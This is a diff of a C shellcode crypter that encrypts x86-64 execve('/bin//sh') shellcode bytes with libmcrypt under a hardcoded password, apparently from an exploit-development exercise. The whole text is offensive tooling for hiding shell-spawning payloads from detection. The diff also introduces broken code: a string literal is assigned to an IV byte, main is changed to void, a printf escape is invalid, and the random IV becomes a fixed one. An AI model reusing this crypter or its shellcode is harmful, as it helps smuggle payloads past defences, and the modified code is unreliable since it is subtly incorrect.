@@ -27,6 +27,10 @@ Compile using gcc:
 
 #define IV_SIZE 16
 unsigned char password[] = "12345678";
+/* 
+  Making value of IV[16] a fixed one for testings.
+  Just uncomment lines in code to enable random IV
+*/
 unsigned char IV[IV_SIZE];
 
 /*
@@ -34,9 +38,10 @@ unsigned char IV[IV_SIZE];
 	Execve-Shell-Stack.nasm
 */
 unsigned char code[]= \
-"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
+"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
+"\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
 
-int main (void)
+void main (void)
 {
 
 	MCRYPT id_crypt;
@@ -45,6 +50,7 @@ int main (void)
 	/* Initialize the seed for the rand() function to generate IV */
 	srand(time(0));
 
+	/* Print the Orginal Uncrypted Shellcode */
 	printf("\nOriginal Shellcode to Cypher (%d bytes):\n", code_length);
 	for (int i = 0; i < code_length-1; i++)
 	{
@@ -60,7 +66,8 @@ int main (void)
 	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
 	for (int i = 0; i < iv_size; i++)
 	{
-		IV[i] = (unsigned char)rand();
+		IV[i] = "\x01";
+		//IV[i] = (unsigned char)rand();    // Uncomment for random IV
 		printf("\\x%02x", IV[i]);
 	}
 
@@ -106,10 +113,7 @@ int main (void)
 	/* End the mcrypt */
 	mcrypt_generic_end(id_crypt);
 
-
-	printf("\n\n");
-
-	return(0);
+	printf("\n\Crypted!\n\n");
 	
 }	
 
